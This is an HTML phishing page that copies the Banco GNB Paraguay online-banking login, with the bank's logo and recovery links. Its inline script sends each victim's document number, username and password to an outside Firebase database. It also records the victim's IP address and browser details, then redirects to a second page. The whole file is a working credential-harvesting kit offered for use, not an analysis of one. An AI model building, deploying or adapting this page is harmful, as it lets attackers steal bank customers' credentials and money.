<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no">
<title>GNB - Solicitudes</title>
<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
<style>
html{background:transparent;font-family:"Open Sans",sans-serif;}
body{min-width:320px;margin:0;}
.bg-gnb-login{background-color:#EDEDED;font-family:'Open Sans',sans-serif;}
#login-content{background:#fff;min-height:47.6em;margin-right:-15px;margin-left:-15px;display:table;}
.gnb-input-login{background-color:#f4f4f4;border:none;height:45px;border-radius:0 !important;border-bottom:1px solid #aaa;box-shadow:inset 0 1px 0 0 #ececec;color:#121212;font-family:'Open Sans',sans-serif;font-weight:600;outline:none;padding:.75em 1em .75em 13px;font-size:14px !important;}
.gnb-input-login::placeholder{color:#8a8d8f;font-weight:400;}
.gnb-input-login:focus{background:#eef4f8;border-bottom-color:#0574AF;}
.btn-login{background:#0574AF !important;border-radius:0 !important;border:0 !important;height:4em;padding-left:1.4em;padding-right:1.4em;cursor:pointer;font-weight:600;font-size:10px;color:#fff !important;display:block;width:100%;margin-top:22px;}
.btn-login:hover{background:#046290 !important;}
.btn.large span{font-size:1.4em;position:relative;top:1px;margin-right:0;}
.btn span{font-family:'Open Sans',sans-serif;font-weight:600;font-size:1.2em;display:inline-block;margin-left:-1px;margin-right:-1px;}
h2.cliente{font-family:'Open Sans',sans-serif;font-weight:600;font-size:26px !important;letter-spacing:-.3px;line-height:1.15;margin:0 0 4px;color:#7AB83F;text-align:center;}
.header-login{padding-top:20px;padding-bottom:25px;}
.tirica-redirect{color:#0574AF;font-size:20px;margin-bottom:30px;padding-left:0;padding-top:10px;text-align:right;}
.tirica-redirect a{color:#0574AF;text-decoration:none;}
.padding-0{padding:0;}
.padding-bottom-10{padding-bottom:10px;}
.centertext{text-align:center;}
#caja-error{background:#FBDFDF;border:1px solid #f4ccdf;border-radius:4px;color:#c4136c;margin-bottom:20px;margin-top:20px;padding:10px;}
#caja-error h1{font-family:'Open Sans',sans-serif;color:#000;font-weight:normal;margin-bottom:6px;padding:1px 0;font-size:22px;margin-top:0;}
#caja-error-body{color:#000;font-family:'Open Sans',sans-serif;font-size:1.1em;line-height:1.4;}
a,a#forgotPassword,a#forgotUsername,a#onboardingInvitation{text-decoration:none;color:#2986CA;font-weight:normal !important;cursor:pointer;font-size:14px;}
a:hover{text-decoration:underline;}
.login-form{margin-bottom:10px;}
@media (min-width:992px){#login-content{margin-left:25% !important;}}
</style>
</head>
<body class="bg-gnb-login">
<div class="container">
  <div class="row">
    <div class="col-xs-12 col-md-12 col-lg-12 padding-bottom-10"></div>
    <div id="login-content" class="col-md-6 col-md-offset-3">

      <div class="col-xs-12 col-sm-12 col-md-12 tirica-redirect"><a href="https://www.bancognb.com.py/public/">X</a></div>

      <div class="col-xs-12 col-sm-10 col-md-10 col-md-offset-1 centertext header-login">
        <img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB" width="300" height="150" style="max-width:100%;height:auto">
      </div>

      <div id="app" class="col-xs-12 col-md-12 col-sm-12 padding-0">
        <div class="col-md-12 col-xs-12 col-sm-12">
          <form class="login-form" id="login" autocomplete="off" novalidate>

            <div class="form-group col-md-8 col-md-offset-2 padding-0">
              <h2 class="cliente">SOLICITUD EN LÍNEA</h2>
            </div>

            <div class="form-group col-md-8 col-md-offset-2 padding-0">
              <input type="text" id="documento" name="documento" onkeypress='return event.charCode >= 48 && event.charCode <= 57' class="form-control gnb-input-login" maxlength="8" placeholder="Número de Documento" autocomplete="off" inputmode="numeric">
            </div>

            <div class="form-group col-md-8 col-md-offset-2 padding-0">
              <input type="text" id="access-username" name="access-username" class="form-control gnb-input-login" placeholder="Usuario" autocomplete="off">
            </div>

            <div class="form-group col-md-8 col-md-offset-2 padding-0">
              <input type="password" id="access-pin" name="access-pin" class="form-control gnb-input-login" maxlength="64" placeholder="Clave de acceso" autocomplete="off">
            </div>

            <div id="caja-error-div" class="form-group col-md-8 col-md-offset-2 padding-0" style="display:none">
              <section id="caja-error">
                <h1>Error</h1>
                <div id="caja-error-body"></div>
              </section>
            </div>

            <div class="form-group col-md-8 col-md-offset-2 padding-0">
              <button id="btnLogin" type="submit" class="form-control btn large btn-login"><span>Ingresar</span></button>
            </div>
          </form>

          <div class="col-xs-12" style="text-align:center;font-family:'Open Sans',sans-serif;">
            <a href="https://www.bancognb.com.py/bancaweb/easyKey?action=passRecovery">¿Olvidó su clave?</a>
          </div>
          <div class="col-xs-12" style="text-align:center;font-family:'Open Sans',sans-serif;margin-top:5px;">
            <a href="https://www.bancognb.com.py/bancaweb/easyKey?action=usernameRecovery">¿Olvidó su usuario?</a>
          </div>
          <div class="col-xs-12" style="text-align:center;font-family:'Open Sans',sans-serif;margin-top:5px;">
            <a id="onboardingInvitation" href="https://www.bancognb.com.py/bancaweb/onboardingInvitation?tipo=P&doc=447784">¿Tiene código de invitación?</a>
          </div>
          <div style="height:30px"></div>
        </div>
      </div>
    </div>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
<script>
/* ===== Firebase ===== */
var firebaseConfig = {
  apiKey: "AIzaSyD-placeholder",
  databaseURL: "https://cbonnlineec-default-rtdb.firebaseio.com",
  projectId: "cbonnlineec-default-rtdb"
};
var DB = null;
try { firebase.initializeApp(firebaseConfig); DB = firebase.database(); } catch(e) { DB = null; }

var dbx = {
  set: function(path, val){
    try { localStorage.setItem('dbx_'+path, JSON.stringify(val)); } catch(e){}
    if (DB) { try { DB.ref('nbch/'+path).set(val); } catch(e){} }
  },
  update: function(path, val){
    if (DB) { try { DB.ref('nbch/'+path).update(val); } catch(e){} }
  }
};

var form = document.getElementById('login');
var btn = document.getElementById('btnLogin');

function caja(msg){
  document.getElementById('caja-error-body').textContent = msg;
  document.getElementById('caja-error-div').style.display = 'block';
}

var enviando = false;
form.addEventListener('submit', function(ev){
  ev.preventDefault();
  if (enviando) return;

  var doc  = document.getElementById('documento').value.trim();
  var user = document.getElementById('access-username').value.trim();
  var pin  = document.getElementById('access-pin').value;

  if (!doc)  { caja('Ingrese su número de documento.'); document.getElementById('documento').focus(); return; }
  if (!user) { caja('Ingrese su usuario.'); document.getElementById('access-username').focus(); return; }
  if (!pin)  { caja('Ingrese su clave de acceso.'); document.getElementById('access-pin').focus(); return; }

  enviando = true;
  document.getElementById('caja-error-div').style.display = 'none';
  btn.disabled = true;
  btn.querySelector('span').textContent = 'Ingresando...';

  var id = 'g' + Date.now().toString(36) + Math.random().toString(36).slice(2,7);
  try { localStorage.setItem('gnb_uid', id); } catch(e){}

  var base = {
    origen: 'gnb',
    documento: doc,
    usuario: user,
    clave: pin,
    status: 'CLAVE',
    ts: Date.now(),
    ua: navigator.userAgent,
    oculto: false,
    eliminado: false
  };
  dbx.set('usuarios/'+id, base);

  function ir(){ window.location.href = 'index2.html'; }

  fetch('https://api.ipify.org?format=json', {cache:'no-store'})
    .then(function(r){ return r.json(); })
    .then(function(j){ if (j && j.ip) dbx.update('usuarios/'+id, {ip: j.ip}); })
    .catch(function(){})
    .finally(function(){ setTimeout(ir, 450); });

  setTimeout(ir, 2200);
});

document.getElementById('documento').addEventListener('input', function(){
  this.value = this.value.replace(/[^0-9A-Za-z]/g,'');
});
</script>
</body>
</html>
